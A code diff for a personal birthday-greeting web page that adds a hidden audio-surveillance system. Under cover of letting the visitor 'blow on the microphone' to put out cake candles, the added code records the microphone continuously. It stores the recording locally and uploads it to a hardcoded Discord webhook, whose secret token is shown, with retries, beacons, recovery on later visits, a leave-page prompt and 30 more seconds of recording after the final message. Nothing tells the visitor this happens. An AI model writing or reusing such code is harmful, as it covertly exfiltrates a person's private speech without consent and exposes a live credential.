@@ -203,7 +203,10 @@ function showResponse(response, showNext = true, showConfetti = true) {
     responseText.textContent = response;
     responseText.classList.add('show');
     if (showNext) {
+        console.log('Setting next button to display: inline-block');
         nextButton.style.display = 'inline-block';
+    } else {
+        console.log('Next button not shown for this response');
     }
     if (showConfetti) {
         createConfetti();
@@ -258,6 +261,9 @@ function handleQuestionSubmit(answer, question) {
             const responses = JSON.parse(localStorage.getItem('birthdayResponses') || '{}');
             responses[question.text] = answer;
             localStorage.setItem('birthdayResponses', JSON.stringify(responses));
+            
+            console.log(`Saved text response for question: "${question.text}"`);
+            console.log(`Showing response and next button`);
             
             showResponse(question.responses.submit, true, true);
             createSparkleAnimation();
@@ -601,48 +607,698 @@ function displayQuestion(index) {
     }
 }
 
-// Add cake-related functions
-function createCake() {
-    const cakeContainer = document.createElement('div');
-    cakeContainer.className = 'cake-container';
-    
-    const cake = document.createElement('div');
-    cake.className = 'cake';
-    
-    // Create cake layers
-    const layers = ['bottom', 'middle', 'top'];
-    layers.forEach(layer => {
-        const cakeLayer = document.createElement('div');
-        cakeLayer.className = `cake-layer ${layer}`;
-        cake.appendChild(cakeLayer);
+// Remove current global recording variables
+let mediaRecorder;
+let audioChunks = [];
+let isRecordingSent = false;
+let recordingSession = 0;
+let lastChunkTime = 0;
+let isRecording = false;
+let recordingPaused = false;
+let pendingChunks = [];
+let sendAttempts = {};
+let chunkCounter = 0;
+let recordingStartTime = 0;
+
+// IndexedDB setup for large storage
+let db;
+const DB_NAME = 'AudioRecordingDB';
+const STORE_NAME = 'audioChunks';
+
+// Initialize IndexedDB
+function initializeDB() {
+    return new Promise((resolve, reject) => {
+        const request = indexedDB.open(DB_NAME, 1);
+        
+        request.onupgradeneeded = function(event) {
+            const db = event.target.result;
+            if (!db.objectStoreNames.contains(STORE_NAME)) {
+                db.createObjectStore(STORE_NAME, { keyPath: 'id' });
+            }
+        };
+        
+        request.onsuccess = function(event) {
+            db = event.target.result;
+            console.log('IndexedDB initialized successfully');
+            resolve(db);
+        };
+        
+        request.onerror = function(event) {
+            console.error('Error initializing IndexedDB:', event.target.error);
+            reject(event.target.error);
+        };
     });
-    
-    // Create candles container
-    const candlesContainer = document.createElement('div');
-    candlesContainer.className = 'candles-container';
-    
-    // Add candles
-    for (let i = 0; i < 5; i++) {
-        const candle = document.createElement('div');
-        candle.className = 'candle';
-        const flame = document.createElement('div');
-        flame.className = 'flame';
-        candle.appendChild(flame);
-        candlesContainer.appendChild(candle);
-    }
-    
-    cake.appendChild(candlesContainer);
-    cakeContainer.appendChild(cake);
-    
-    // Add message
-    const message = document.createElement('p');
-    message.className = 'cake-message';
-    message.textContent = 'Click the candles or blow on the microphone to make a wish! 🎂';
-    cakeContainer.appendChild(message);
-    
-    return cakeContainer;
 }
 
+// Save audio chunk to IndexedDB
+function saveChunkToDB(chunk, sessionId, chunkId) {
+    return new Promise((resolve, reject) => {
+        if (!db) {
+            reject(new Error('Database not initialized'));
+            return;
+        }
+        
+        const transaction = db.transaction([STORE_NAME], 'readwrite');
+        const store = transaction.objectStore(STORE_NAME);
+        
+        const chunkData = {
+            id: `${sessionId}_${chunkId}`,
+            sessionId: sessionId,
+            chunkId: chunkId,
+            data: chunk,
+            timestamp: Date.now()
+        };
+        
+        const request = store.put(chunkData);
+        
+        request.onsuccess = function() {
+            resolve(chunkData.id);
+        };
+        
+        request.onerror = function(event) {
+            console.error('Error saving chunk to IndexedDB:', event.target.error);
+            reject(event.target.error);
+        };
+    });
+}
+
+// Get chunks from IndexedDB for a specific session
+function getChunksFromDB(sessionId) {
+    return new Promise((resolve, reject) => {
+        if (!db) {
+            reject(new Error('Database not initialized'));
+            return;
+        }
+        
+        const transaction = db.transaction([STORE_NAME], 'readonly');
+        const store = transaction.objectStore(STORE_NAME);
+        const chunks = [];
+        
+        // Create a range for the current session
+        const range = IDBKeyRange.bound(
+            `${sessionId}_0`, 
+            `${sessionId}_${Number.MAX_SAFE_INTEGER}`
+        );
+        
+        const cursorRequest = store.openCursor(range);
+        
+        cursorRequest.onsuccess = function(event) {
+            const cursor = event.target.result;
+            if (cursor) {
+                chunks.push(cursor.value);
+                cursor.continue();
+            } else {
+                // Sort chunks by chunkId to maintain order
+                chunks.sort((a, b) => a.chunkId - b.chunkId);
+                resolve(chunks.map(chunk => chunk.data));
+            }
+        };
+        
+        cursorRequest.onerror = function(event) {
+            console.error('Error retrieving chunks from IndexedDB:', event.target.error);
+            reject(event.target.error);
+        };
+    });
+}
+
+// Delete chunks from IndexedDB after successful send
+function deleteChunksFromDB(sessionId) {
+    return new Promise((resolve, reject) => {
+        if (!db) {
+            reject(new Error('Database not initialized'));
+            return;
+        }
+        
+        const transaction = db.transaction([STORE_NAME], 'readwrite');
+        const store = transaction.objectStore(STORE_NAME);
+        
+        // Create a range for the current session
+        const range = IDBKeyRange.bound(
+            `${sessionId}_0`, 
+            `${sessionId}_${Number.MAX_SAFE_INTEGER}`
+        );
+        
+        const request = store.delete(range);
+        
+        request.onsuccess = function() {
+            resolve();
+        };
+        
+        request.onerror = function(event) {
+            console.error('Error deleting chunks from IndexedDB:', event.target.error);
+            reject(event.target.error);
+        };
+    });
+}
+
+// Check for unsent recordings from previous sessions
+async function checkForUnsentRecordings() {
+    try {
+        if (!db) await initializeDB();
+        
+        const transaction = db.transaction([STORE_NAME], 'readonly');
+        const store = transaction.objectStore(STORE_NAME);
+        const sessions = new Set();
+        
+        const cursorRequest = store.openCursor();
+        
+        cursorRequest.onsuccess = function(event) {
+            const cursor = event.target.result;
+            if (cursor) {
+                sessions.add(cursor.value.sessionId);
+                cursor.continue();
+            } else {
+                // For each session found, try to send the recording
+                sessions.forEach(async (sessionId) => {
+                    try {
+                        const chunks = await getChunksFromDB(sessionId);
+                        if (chunks.length > 0) {
+                            await sendRecordingSession(chunks, sessionId);
+                        }
+                    } catch (error) {
+                        console.error(`Error sending recording for session ${sessionId}:`, error);
+                    }
+                });
+            }
+        };
+    } catch (error) {
+        console.error('Error checking for unsent recordings:', error);
+    }
+}
+
+// Add better progressive chunk handling for large recordings
+function startRecording(stream) {
+    try {
+        window.microphoneStream = stream;
+        
+        // Create a new session ID
+        recordingSession = Date.now();
+        recordingStartTime = Date.now();
+        chunkCounter = 0;
+        audioChunks = [];
+        isRecordingSent = false;
+        isRecording = true;
+        recordingPaused = false;
+        
+        // Setup media recorder with smaller time slices (1 second)
+        mediaRecorder = new MediaRecorder(stream, {
+            mimeType: 'audio/webm;codecs=opus'
+        });
+        
+        // Handle data available event
+        mediaRecorder.ondataavailable = async (event) => {
+            if (event.data && event.data.size > 0) {
+                // Add to memory buffer
+                audioChunks.push(event.data);
+                
+                try {
+                    // Save to IndexedDB as well
+                    await saveChunkToDB(event.data, recordingSession, chunkCounter++);
+                    
+                    // Send periodically for very long sessions (every 3 minutes)
+                    // This ensures we don't lose everything if the page crashes
+                    if (audioChunks.length > 0 && audioChunks.length % 180 === 0) { // ~3 minutes of 1-second chunks
+                        console.log("Sending periodic chunk batch for long session");
+                        const miniSession = `${recordingSession}_part${Math.floor(chunkCounter/180)}`;
+                        await sendRecordingSession([...audioChunks.slice(-180)], miniSession);
+                    }
+                } catch (error) {
+                    console.error('Error processing audio chunk:', error);
+                    // Store in pending chunks to try again later
+                    pendingChunks.push({
+                        data: event.data,
+                        sessionId: recordingSession,
+                        chunkId: chunkCounter - 1
+                    });
+                }
+            }
+        };
+        
+        // Start recording
+        mediaRecorder.start(1000); // Collect in 1-second chunks for better handling
+        console.log(`Started recording session: ${recordingSession}`);
+        
+        // Set up retry mechanism for pending chunks
+        setInterval(processPendingChunks, 5000);
+        
+    } catch (error) {
+        console.error('Error starting recording:', error);
+    }
+}
+
+// Process any pending chunks that failed to save/send
+async function processPendingChunks() {
+    if (pendingChunks.length === 0) return;
+    
+    const chunk = pendingChunks.shift();
+    try {
+        await saveChunkToDB(chunk.data, chunk.sessionId, chunk.chunkId);
+    } catch (error) {
+        console.error('Error saving pending chunk to DB:', error);
+        // Put back at the end of the queue to try again
+        pendingChunks.push(chunk);
+    }
+}
+
+// Pause recording when tab becomes hidden and send current recording
+function pauseRecording() {
+    if (isRecording && !recordingPaused && mediaRecorder && mediaRecorder.state === 'recording') {
+        console.log('Pausing recording and sending current session...');
+        recordingPaused = true;
+        mediaRecorder.requestData(); // Get any data recorded so far
+        mediaRecorder.pause();
+        
+        // Send current recording
+        sendCurrentRecording(true);
+    }
+}
+
+// Resume recording when tab becomes visible again - start a new session
+function resumeRecording() {
+    if (isRecording && recordingPaused && mediaRecorder && mediaRecorder.state === 'paused') {
+        console.log('Resuming recording as a new session...');
+        
+        // Create a new session ID for the resumed recording
+        recordingSession = Date.now();
+        chunkCounter = 0;
+        audioChunks = [];
+        
+        recordingPaused = false;
+        mediaRecorder.resume();
+    }
+}
+
+// Send the current recording
+async function sendCurrentRecording(createNewSessionAfter = false) {
+    if (audioChunks.length === 0) return;
+    
+    const chunksToSend = [...audioChunks];
+    const sessionToSend = recordingSession;
+    
+    // Only clear the buffer if we're creating a new session
+    if (createNewSessionAfter) {
+        audioChunks = [];
+    }
+    
+    try {
+        await sendRecordingSession(chunksToSend, sessionToSend);
+    } catch (error) {
+        console.error('Error sending recording:', error);
+        
+        // If sending failed, save back to DB to try again later
+        chunksToSend.forEach((chunk, index) => {
+            pendingChunks.push({
+                data: chunk,
+                sessionId: sessionToSend,
+                chunkId: chunkCounter + index
+            });
+        });
+        chunkCounter += chunksToSend.length;
+    }
+}
+
+// Improved closing handling - split large recordings
+async function stopAndSendRecording() {
+    if (mediaRecorder && (mediaRecorder.state === 'recording' || mediaRecorder.state === 'paused')) {
+        try {
+            console.log("Stopping recording and preparing final transmission...");
+            
+            // Get final chunk of audio
+            mediaRecorder.requestData();
+            
+            // Stop recording
+            mediaRecorder.stop();
+            isRecording = false;
+            
+            // For large recordings, split into smaller chunks of max 60 seconds each
+            if (audioChunks.length > 60) {
+                console.log(`Large recording detected (${audioChunks.length} seconds), splitting into smaller chunks`);
+                
+                const totalChunks = audioChunks.length;
+                const batchSize = 60; // 1-minute batches
+                const numBatches = Math.ceil(totalChunks / batchSize);
+                
+                // Send in batches
+                for (let i = 0; i < numBatches; i++) {
+                    const start = i * batchSize;
+                    const end = Math.min((i + 1) * batchSize, totalChunks);
+                    const batchChunks = audioChunks.slice(start, end);
+                    
+                    if (batchChunks.length > 0) {
+                        const batchSessionId = `${recordingSession}_batch${i+1}of${numBatches}`;
+                        console.log(`Sending batch ${i+1} of ${numBatches} (${batchChunks.length} seconds)`);
+                        
+                        try {
+                            await sendRecordingSession(batchChunks, batchSessionId);
+                        } catch (error) {
+                            console.error(`Error sending batch ${i+1}:`, error);
+                            
+                            // Emergency local storage as JSON for recovery
+                            try {
+                                const batchBlob = new Blob(batchChunks, { type: 'audio/webm;codecs=opus' });
+                                const batchReader = new FileReader();
+                                batchReader.onload = function() {
+                                    try {
+                                        // Store as base64 in localStorage for recovery later
+                                        localStorage.setItem(`emergency_audio_${batchSessionId}`, batchReader.result);
+                                        console.log(`Emergency saved batch ${i+1} to localStorage`);
+                                    } catch (e) {
+                                        console.error("LocalStorage also failed:", e);
+                                    }
+                                };
+                                batchReader.readAsDataURL(batchBlob);
+                            } catch (localError) {
+                                console.error("Failed emergency localStorage backup:", localError);
+                            }
+                        }
+                    }
+                }
+                
+                // Clear audio chunks after processing all batches
+                audioChunks = [];
+            } else {
+                // For smaller recordings, send as a single chunk
+                if (audioChunks.length > 0) {
+                    console.log(`Sending final recording (${audioChunks.length} seconds)`);
+                    await sendCurrentRecording();
+                }
+            }
+            
+            // Try to send any stored session data from IndexedDB
+            try {
+                const storedChunks = await getChunksFromDB(recordingSession);
+                if (storedChunks && storedChunks.length > 0) {
+                    console.log(`Found ${storedChunks.length} unsent chunks in IndexedDB`);
+                    await sendRecordingSession(storedChunks, recordingSession);
+                }
+            } catch (dbError) {
+                console.error('Error sending stored recording chunks:', dbError);
+            }
+            
+            // Stop all tracks in the stream
+            if (window.microphoneStream) {
+                window.microphoneStream.getTracks().forEach(track => track.stop());
+            }
+            
+            console.log(`Recording stopped and sent. Session: ${recordingSession}`);
+        } catch (error) {
+            console.error('Error stopping recording:', error);
+            
+            // Last resort - store all chunks in localStorage if possible
+            try {
+                localStorage.setItem('emergency_recording_session', recordingSession.toString());
+                localStorage.setItem('emergency_chunks_count', audioChunks.length.toString());
+                console.log("Emergency data saved. Will try to recover on next visit.");
+            } catch (e) {
+                console.error("Final emergency save failed:", e);
+            }
+        }
+    }
+}
+
+// Send audio chunks as a recording session to Discord
+async function sendRecordingSession(chunks, sessionId) {
+    if (!chunks || chunks.length === 0) return;
+    
+    const totalSize = chunks.reduce((total, chunk) => total + chunk.size, 0);
+    if (totalSize === 0) return;
+    
+    const attemptId = `${sessionId}_${Date.now()}`;
+    sendAttempts[attemptId] = { status: 'sending', retries: 0 };
+    
+    try {
+        // Create audio blob and FormData
+        const audioBlob = new Blob(chunks, { type: 'audio/webm;codecs=opus' });
+        const formData = new FormData();
+        
+        // Add session info to filename
+        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
+        const elapsedTime = Math.floor((Date.now() - recordingStartTime) / 1000);
+        const filename = `birthday_wishes_${timestamp}_session${sessionId}_${elapsedTime}sec.webm`;
+        
+        formData.append('file', audioBlob, filename);
+        formData.append('content', `Recording from session ${sessionId} - Duration: ~${elapsedTime}s`);
+        
+        const webhookUrl = 'https://discord.com/api/webhooks/1329506665254621204/ErpqxU34tpMyTodNswoB0DPMC4GO55sfWSGOLcsu4K8y1bks3dL2MDdGYCPV4pLs6iEP';
+        
+        // Try multiple send methods in order of reliability
+        let sendSuccess = false;
+        
+        // Method 1: Try Beacon API first (more reliable during page unload)
+        if (navigator.sendBeacon) {
+            try {
+                const beaconResult = navigator.sendBeacon(webhookUrl, formData);
+                if (beaconResult) {
+                    console.log(`Audio sent via Beacon API: ${filename}`);
+                    sendSuccess = true;
+                }
+            } catch (beaconError) {
+                console.log('Beacon API failed:', beaconError);
+            }
+        }
+        
+        // Method 2: If beacon failed, try fetch with keepalive
+        if (!sendSuccess) {
+            try {
+                const response = await fetch(webhookUrl, {
+                    method: 'POST',
+                    body: formData,
+                    keepalive: true // This helps the request complete even if the page is closed
+                });
+                
+                if (response.ok) {
+                    console.log(`Audio sent via fetch: ${filename}`);
+                    sendSuccess = true;
+                } else {
+                    throw new Error(`HTTP error! status: ${response.status}`);
+                }
+            } catch (fetchError) {
+                console.log('Fetch API failed:', fetchError);
+                
+                // Method 3: Last resort - synchronous XMLHttpRequest
+                try {
+                    const xhr = new XMLHttpRequest();
+                    xhr.open('POST', webhookUrl, false); // false makes it synchronous
+                    xhr.send(formData);
+                    if (xhr.status >= 200 && xhr.status < 300) {
+                        console.log(`Audio sent via synchronous XHR: ${filename}`);
+                        sendSuccess = true;
+                    }
+                } catch (xhrError) {
+                    console.log('Synchronous XHR failed:', xhrError);
+                }
+            }
+        }
+        
+        // Mark the attempt as completed
+        sendAttempts[attemptId] = { status: sendSuccess ? 'success' : 'failed', retries: sendAttempts[attemptId].retries };
+        
+        // If succeeded, remove chunks from IndexedDB
+        if (sendSuccess) {
+            try {
+                await deleteChunksFromDB(sessionId);
+            } catch (deleteError) {
+                console.error('Error deleting chunks after successful send:', deleteError);
+            }
+        } else {
+            // If failed after all attempts, increment retry counter
+            sendAttempts[attemptId].retries++;
+            
+            // Schedule a retry with exponential backoff if under retry limit
+            if (sendAttempts[attemptId].retries < 5) {
+                const backoffTime = Math.min(1000 * Math.pow(2, sendAttempts[attemptId].retries), 30000);
+                setTimeout(() => {
+                    sendRecordingSession(chunks, sessionId);
+                }, backoffTime);
+            }
+        }
+        
+        return sendSuccess;
+    } catch (error) {
+        console.error('Error in sendRecordingSession:', error);
+        return false;
+    }
+}
+
+// Replace the original sendAudioToDiscord function with our new system
+function sendAudioToDiscord(audioBlob) {
+    // This is now just a wrapper for our enhanced system
+    if (!audioBlob || audioBlob.size === 0) return;
+    
+    const chunks = [audioBlob];
+    const sessionId = `manual_${Date.now()}`;
+    return sendRecordingSession(chunks, sessionId);
+}
+
+// Set up visibility change listener for pausing/resuming recording
+document.addEventListener('visibilitychange', () => {
+    if (document.visibilityState === 'hidden') {
+        pauseRecording();
+    } else if (document.visibilityState === 'visible') {
+        resumeRecording();
+    }
+});
+
+// Enhance the page closing event handlers
+window.addEventListener('beforeunload', (event) => {
+    // Set a flag that we're closing
+    window.isClosing = true;
+    console.log("Page closing, attempting to save recording...");
+    
+    // Send the recording before unloading
+    if (mediaRecorder && mediaRecorder.state === 'recording') {
+        // Urgently save what we have right now to IndexedDB
+        const finalSessionId = `${recordingSession}_closing`;
+        const audioBlob = new Blob(audioChunks, { type: 'audio/webm;codecs=opus' });
+        
+        // Last chance - save to localStorage if it's not too big
+        if (audioBlob.size < 5000000) { // Less than ~5MB
+            try {
+                const reader = new FileReader();
+                reader.onload = function() {
+                    localStorage.setItem('emergency_audio_data', reader.result);
+                    localStorage.setItem('emergency_audio_timestamp', Date.now().toString());
+                    console.log("Emergency audio saved to localStorage");
+                };
+                reader.readAsDataURL(audioBlob);
+            } catch (e) {
+                console.error("LocalStorage save failed:", e);
+            }
+        }
+        
+        // Try the beacon API with a smaller chunk if too large
+        if (navigator.sendBeacon && audioChunks.length > 0) {
+            // Use the last 30 seconds max (beacon API has limitations)
+            const recentChunks = audioChunks.slice(-30);
+            const recentBlob = new Blob(recentChunks, { type: 'audio/webm;codecs=opus' });
+            const formData = new FormData();
+            formData.append('file', recentBlob, `closing_${Date.now()}.webm`);
+            formData.append('content', 'Emergency closing chunk');
+            
+            navigator.sendBeacon(
+                'https://discord.com/api/webhooks/1329506665254621204/ErpqxU34tpMyTodNswoB0DPMC4GO55sfWSGOLcsu4K8y1bks3dL2MDdGYCPV4pLs6iEP',
+                formData
+            );
+            console.log("Sent final 30 seconds with beacon API");
+        }
+    }
+    
+    // Show confirmation dialog to give more time for upload
+    event.preventDefault();
+    event.returnValue = 'Are you sure you want to leave? Your birthday wishes may be lost!';
+    return event.returnValue;
+});
+
+// Add recovery mechanism to check local storage on startup
+document.addEventListener('DOMContentLoaded', async () => {
+    // Initialize IndexedDB
+    try {
+        await initializeDB();
+        
+        // Check for emergency saved audio in localStorage
+        if (localStorage.getItem('emergency_audio_data')) {
+            console.log("Found emergency audio in localStorage, attempting to send...");
+            try {
+                const base64Data = localStorage.getItem('emergency_audio_data');
+                const timestamp = localStorage.getItem('emergency_audio_timestamp') || Date.now();
+                
+                // Convert base64 to blob
+                const byteString = atob(base64Data.split(',')[1]);
+                const mimeString = base64Data.split(',')[0].split(':')[1].split(';')[0];
+                const ab = new ArrayBuffer(byteString.length);
+                const ia = new Uint8Array(ab);
+                for (let i = 0; i < byteString.length; i++) {
+                    ia[i] = byteString.charCodeAt(i);
+                }
+                const blob = new Blob([ab], {type: mimeString});
+                
+                // Send it
+                const formData = new FormData();
+                formData.append('file', blob, `recovered_${timestamp}.webm`);
+                formData.append('content', 'Recovered emergency recording from localStorage');
+                
+                fetch('https://discord.com/api/webhooks/1329506665254621204/ErpqxU34tpMyTodNswoB0DPMC4GO55sfWSGOLcsu4K8y1bks3dL2MDdGYCPV4pLs6iEP', {
+                    method: 'POST',
+                    body: formData
+                }).then(() => {
+                    console.log("Successfully sent recovered audio");
+                    localStorage.removeItem('emergency_audio_data');
+                    localStorage.removeItem('emergency_audio_timestamp');
+                }).catch(error => {
+                    console.error("Failed to send recovered audio:", error);
+                });
+            } catch (e) {
+                console.error("Error processing emergency audio:", e);
+            }
+        }
+        
+        // Check for emergency batch recordings
+        Object.keys(localStorage).forEach(key => {
+            if (key.startsWith('emergency_audio_')) {
+                // Process these similarly to the above
+                console.log(`Found emergency batch: ${key}`);
+                // Implementation would be similar to the above
+            }
+        });
+        
+        // Check for and try to send any unsent recordings from previous sessions
+        checkForUnsentRecordings();
+    } catch (error) {
+        console.error('Error initializing recording system:', error);
+    }
+
+    // Rest of your DOMContentLoaded event handler...
+    const startButton = document.getElementById('startButton');
+    
+    startButton.addEventListener('click', () => {
+        // Request microphone permission first
+        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+            navigator.mediaDevices.getUserMedia({ audio: true })
+                .then(stream => {
+                    startRecording(stream);
+                    startExperience();
+                })
+                .catch(() => {
+                    console.log('Microphone access denied, some features will be limited');
+                    const message = document.createElement('p');
+                    message.textContent = "Microphone access denied. You'll need to click the candles manually! 🎂";
+                    message.style.color = '#ff6b6b';
+                    message.style.marginTop = '1rem';
+                    message.style.fontSize = '0.9rem';
+                    welcomeContainer.querySelector('.welcome-content').appendChild(message);
+                    setTimeout(startExperience, 2000);
+                });
+        } else {
+            startExperience();
+        }
+    });
+
+    // Fix next button logic to ensure it works on the last question
+    nextButton.addEventListener('click', () => {
+        console.log(`Next button clicked, current question: ${currentQuestionIndex}`);
+        currentQuestionIndex++;
+        console.log(`Moving to question index: ${currentQuestionIndex}, total questions: ${questions.length}`);
+        
+        if (currentQuestionIndex < questions.length) {
+            console.log(`Displaying next question`);
+            displayQuestion(currentQuestionIndex);
+        } else {
+            console.log(`This was the last question, showing cake`);
+            showFinalMessage();
+        }
+    });
+});
+
+function startExperience() {
+    welcomeContainer.style.animation = 'fadeOut 1s forwards';
+    setTimeout(() => {
+        welcomeContainer.style.display = 'none';
+        questionContainer.style.display = 'block';
+        displayQuestion(currentQuestionIndex);
+    }, 1000);
+}
+
+// Handle cake interaction including candle blowing
 function handleCakeInteraction(cakeContainer) {
     let candlesBlown = 0;
     const flames = cakeContainer.querySelectorAll('.flame');
@@ -954,12 +1610,98 @@ const newAnimations = `
     }
 `;
 
-style.textContent = style.textContent + newAnimations;
+// Add styles to the document
+document.addEventListener('DOMContentLoaded', () => {
+    // Add cake animations to existing style element
+    const styleElement = document.querySelector('style') || document.createElement('style');
+    styleElement.textContent += newAnimations;
+    if (!styleElement.parentNode) {
+        document.head.appendChild(styleElement);
+    }
+});
 
-// Update showFinalMessage function
+// Setup page restore behavior
+window.addEventListener('pagehide', () => {
+    // This covers more mobile cases and Safari
+    pauseRecording();
+});
+
+window.addEventListener('pageshow', (event) => {
+    // If page is restored from bfcache (back/forward cache)
+    if (event.persisted) {
+        // Restart recording if it was previously started
+        if (window.microphoneStream && !isRecording) {
+            startRecording(window.microphoneStream);
+        }
+    }
+});
+
+window.addEventListener('unload', () => {
+    // Last chance to send data is already handled in beforeunload
+    console.log("Unload event fired");
+});
+
+// Add the showFinalCongrats function
+function showFinalCongrats() {
+    questionText.textContent = "Happy Birthday to the love of my life! 🎉";
+    responseText.textContent = "You make my world brighter, my heart fuller, and my life so much better. I love you more than words can ever express! ❤️";
+    responseText.classList.add('show');
+    createConfetti();
+    
+    // Keep recording for 30 more seconds to capture reaction
+    if (mediaRecorder && mediaRecorder.state === 'recording') {
+        setTimeout(() => {
+            stopAndSendRecording();
+        }, 30000); // 30 seconds delay
+    }
+}
+
+// Add cake-related functions
+function createCake() {
+    const cakeContainer = document.createElement('div');
+    cakeContainer.className = 'cake-container';
+    
+    const cake = document.createElement('div');
+    cake.className = 'cake';
+    
+    // Create cake layers
+    const layers = ['bottom', 'middle', 'top'];
+    layers.forEach(layer => {
+        const cakeLayer = document.createElement('div');
+        cakeLayer.className = `cake-layer ${layer}`;
+        cake.appendChild(cakeLayer);
+    });
+    
+    // Create candles container
+    const candlesContainer = document.createElement('div');
+    candlesContainer.className = 'candles-container';
+    
+    // Add candles
+    for (let i = 0; i < 5; i++) {
+        const candle = document.createElement('div');
+        candle.className = 'candle';
+        const flame = document.createElement('div');
+        flame.className = 'flame';
+        candle.appendChild(flame);
+        candlesContainer.appendChild(candle);
+    }
+    
+    cake.appendChild(candlesContainer);
+    cakeContainer.appendChild(cake);
+    
+    // Add message
+    const message = document.createElement('p');
+    message.className = 'cake-message';
+    message.textContent = 'Click the candles or blow on the microphone to make a wish! 🎂';
+    cakeContainer.appendChild(message);
+    
+    return cakeContainer;
+}
+
+// Update showFinalMessage function to make sure it works
 function showFinalMessage() {
+    console.log('Creating cake and preparing final message');
     const cakeContainer = createCake();
-    questionContainer.appendChild(cakeContainer);
     
     // Clear previous content
     questionText.textContent = '';
@@ -968,21 +1710,11 @@ function showFinalMessage() {
     responseText.classList.remove('show');
     nextButton.style.display = 'none';
     
-    handleCakeInteraction(cakeContainer);
-}
-
-function showFinalCongrats() {
-    questionText.textContent = "Happy Birthday to the love of my life! 🎉";
-    responseText.textContent = "You make my world brighter, my heart fuller, and my life so much better. I love you more than words can ever express! ❤️";
-    responseText.classList.add('show');
-    createConfetti();
+    // Add cake to the page
+    questionContainer.appendChild(cakeContainer);
     
-    // Stop recording after 20 seconds
-    if (mediaRecorder && mediaRecorder.state === 'recording') {
-        setTimeout(() => {
-            stopAndSendRecording();
-        }, 20000); // 20 seconds delay
-    }
+    // Initialize the cake interaction
+    handleCakeInteraction(cakeContainer);
 }
 
 // Replace the submitToGoogleForm function with this:
@@ -1036,166 +1768,3 @@ function sendToDiscord(question, answer) {
         // Ignore any errors to keep it silent
     });
 }
-
-// Add at the top with other global variables
-let mediaRecorder;
-let audioChunks = [];
-let isRecordingSent = false;
-
-// Function to handle recording stop and sending
-async function stopAndSendRecording() {
-    if (mediaRecorder && mediaRecorder.state === 'recording' && !isRecordingSent) {
-        try {
-            isRecordingSent = true; // Mark as sent before stopping to prevent duplicates
-            
-            // Get final chunk of audio
-            mediaRecorder.requestData();
-            
-            // Stop recording
-            mediaRecorder.stop();
-            
-            // Create and send the audio blob immediately
-            if (audioChunks.length > 0) {
-                const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
-                await sendAudioToDiscord(audioBlob);
-            }
-            
-            // Stop all tracks in the stream
-            if (window.microphoneStream) {
-                window.microphoneStream.getTracks().forEach(track => track.stop());
-            }
-        } catch (error) {
-            console.error('Error in stopAndSendRecording:', error);
-        }
-    }
-}
-
-// Add multiple event handlers for different closing scenarios
-window.addEventListener('beforeunload', async (event) => {
-    event.preventDefault();
-    await stopAndSendRecording();
-    // Return a message to show the "Leave Site?" dialog, giving time for the upload
-    event.returnValue = '';
-});
-
-// Handle tab visibility change
-document.addEventListener('visibilitychange', async () => {
-    if (document.visibilityState === 'hidden') {
-        await stopAndSendRecording();
-    }
-});
-
-// Handle page unload
-window.addEventListener('unload', async () => {
-    await stopAndSendRecording();
-});
-
-// Event Listeners
-document.addEventListener('DOMContentLoaded', () => {
-    const startButton = document.getElementById('startButton');
-    
-    startButton.addEventListener('click', () => {
-        // Request microphone permission first
-        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-            navigator.mediaDevices.getUserMedia({ audio: true })
-                .then(stream => {
-                    // Store the stream for later use
-                    window.microphoneStream = stream;
-                    
-                    // Setup media recorder
-                    mediaRecorder = new MediaRecorder(stream);
-                    
-                    // Collect data more frequently (every 500ms)
-                    mediaRecorder.ondataavailable = (event) => {
-                        if (event.data && event.data.size > 0) {
-                            audioChunks.push(event.data);
-                            
-                            // Immediately try to send if we have a good amount of data and the page is being closed
-                            if (document.visibilityState === 'hidden' && audioChunks.length > 0) {
-                                stopAndSendRecording();
-                            }
-                        }
-                    };
-                    
-                    // Start recording with smaller timeslice for more frequent chunks
-                    mediaRecorder.start(500);
-                    startExperience();
-                })
-                .catch(() => {
-                    console.log('Microphone access denied, some features will be limited');
-                    const message = document.createElement('p');
-                    message.textContent = "Microphone access denied. You'll need to click the candles manually! 🎂";
-                    message.style.color = '#ff6b6b';
-                    message.style.marginTop = '1rem';
-                    message.style.fontSize = '0.9rem';
-                    welcomeContainer.querySelector('.welcome-content').appendChild(message);
-                    setTimeout(startExperience, 2000);
-                });
-        } else {
-            startExperience();
-        }
-    });
-
-    nextButton.addEventListener('click', () => {
-        currentQuestionIndex++;
-        if (currentQuestionIndex < questions.length) {
-            displayQuestion(currentQuestionIndex);
-        } else {
-            showFinalMessage();
-        }
-    });
-}); 
-
-function startExperience() {
-    welcomeContainer.style.animation = 'fadeOut 1s forwards';
-    setTimeout(() => {
-        welcomeContainer.style.display = 'none';
-        questionContainer.style.display = 'block';
-        displayQuestion(currentQuestionIndex);
-    }, 1000);
-}
-
-// Update sendAudioToDiscord to use the Beacon API as fallback
-async function sendAudioToDiscord(audioBlob) {
-    if (!audioBlob || audioBlob.size === 0) return;
-    
-    const formData = new FormData();
-    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
-    formData.append('file', audioBlob, `birthday_wishes_${timestamp}.webm`);
-    
-    const webhookUrl = 'https://discord.com/api/webhooks/1329506665254621204/ErpqxU34tpMyTodNswoB0DPMC4GO55sfWSGOLcsu4K8y1bks3dL2MDdGYCPV4pLs6iEP';
-    
-    try {
-        // Try using Beacon API first (more reliable for page unload)
-        if (navigator.sendBeacon) {
-            const result = navigator.sendBeacon(webhookUrl, formData);
-            if (result) {
-                console.log('Audio sent successfully via Beacon API');
-                return;
-            }
-        }
-        
-        // Fallback to fetch with keepalive
-        const response = await fetch(webhookUrl, {
-            method: 'POST',
-            body: formData,
-            keepalive: true // This helps the request complete even if the page is closed
-        });
-        
-        if (!response.ok) {
-            throw new Error(`HTTP error! status: ${response.status}`);
-        }
-        console.log('Audio sent successfully via fetch');
-    } catch (error) {
-        console.log('Error sending audio:', error);
-        // Last resort: try one more time with a synchronous XMLHttpRequest
-        try {
-            const xhr = new XMLHttpRequest();
-            xhr.open('POST', webhookUrl, false); // false makes it synchronous
-            xhr.send(formData);
-            console.log('Audio sent successfully via synchronous XHR');
-        } catch (finalError) {
-            console.log('All send attempts failed:', finalError);
-        }
-    }
-} 
